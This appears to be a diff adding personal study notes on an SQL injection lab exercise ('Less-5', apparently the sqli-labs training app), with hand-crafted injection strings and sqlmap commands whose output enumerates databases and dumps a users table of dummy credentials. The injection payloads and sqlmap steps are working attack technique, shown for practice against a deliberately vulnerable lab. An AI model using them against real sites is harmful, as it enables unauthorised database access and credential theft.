@@ -1,0 +1,102 @@
+
+test: 1'
+You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+'1'' LIMIT 0,1
+-> "SELECT * FROM users WHERE id='1'' LIMIT 0,1"
+
+1. back ground operation
+   "SELECT * FROM users WHERE id='$id' LIMIT 0,1"
+
+2. think
+   eg1: force hit
+   ") or 1=("1
+    "SELECT * FROM users WHERE id=("") or 1=("1") LIMIT 0,1"
+   eg2: force hit and drop code behind
+    1") or 1=1 --+
+    "SELECT * FROM users WHERE id=("1") or 1=1 -- ") LIMIT 0,1"
+
+3. knowledge
+
+###    Using SqlMap to Inject this lesson   ####
+
+
+1. sqlmap.py -u "http://10.136.27.177:8910/websec/sql/Less-5/index.php?id=1" -tag id -v3 --dbms mysql
+
+    sqlmap resumed the following injection point(s) from stored session:
+    ---
+    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: AND boolean-based blind - WHERE or HAVING clause
+        Payload: id=1' AND 3102=3102 AND 'diZm'='diZm
+        Vector: AND [INFERENCE]
+
+        Type: error-based
+        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+        Payload: id=1' AND (SELECT 7072 FROM(SELECT COUNT(*),CONCAT(0x7162787171,(SELECT (ELT(7072=7072,1))),0x717a627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'tyIU'='t
+    yIU
+        Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+        Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind
+        Payload: id=1' AND SLEEP(5) AND 'zYLF'='zYLF
+        Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+    ---
+
+
+2. sqlmap.py -u "http://10.136.27.177:8910/websec/sql/Less-5/index.php?id=1" -tag id -v3 --dbms mysql --dbs
+
+    available databases [5]:
+    [*] challenges
+    [*] information_schema
+    [*] mysql
+    [*] security
+    [*] test
+
+
+3. sqlmap.py -u "http://10.136.27.177:8910/websec/sql/Less-5/index.php?id=1" -tag id -v3 --dbms mysql -D security --tables
+
+    Database: security
+    [4 tables]
+    +----------+
+    | emails   |
+    | referers |
+    | uagents  |
+    | users    |
+    +----------+
+
+4. sqlmap.py -u "http://10.136.27.177:8910/websec/sql/Less-5/index.php?id=1" -tag id -v3 --dbms mysql -D security -T users --columns
+
+    Database: security
+    Table: users
+    [3 columns]
+    +----------+-------------+
+    | Column   | Type        |
+    +----------+-------------+
+    | id       | int(3)      |
+    | password | varchar(20) |
+    | username | varchar(20) |
+    +----------+-------------+
+
+5. sqlmap.py -u "http://10.136.27.177:8910/websec/sql/Less-5/index.php?id=1" -tag id -v3 --dbms mysql -D security -T users --dump
+    Database: security
+    Table: users
+    [13 entries]
+    +----+----------+------------+
+    | id | username | password   |
+    +----+----------+------------+
+    | 1  | Dumb     | Dumb       |
+    | 2  | Angelina | I-kill-you |
+    | 3  | Dummy    | p@ssword   |
+    | 4  | secure   | crappy     |
+    | 5  | stupid   | stupidity  |
+    | 6  | superman | genious    |
+    | 7  | batman   | mob!le     |
+    | 8  | admin    | admin      |
+    | 9  | admin1   | admin1     |
+    | 10 | admin2   | admin2     |
+    | 11 | admin3   | admin3     |
+    | 12 | dhakkan  | dumbo      |
+    | 14 | admin4   | admin4     |
+    +----+----------+------------+
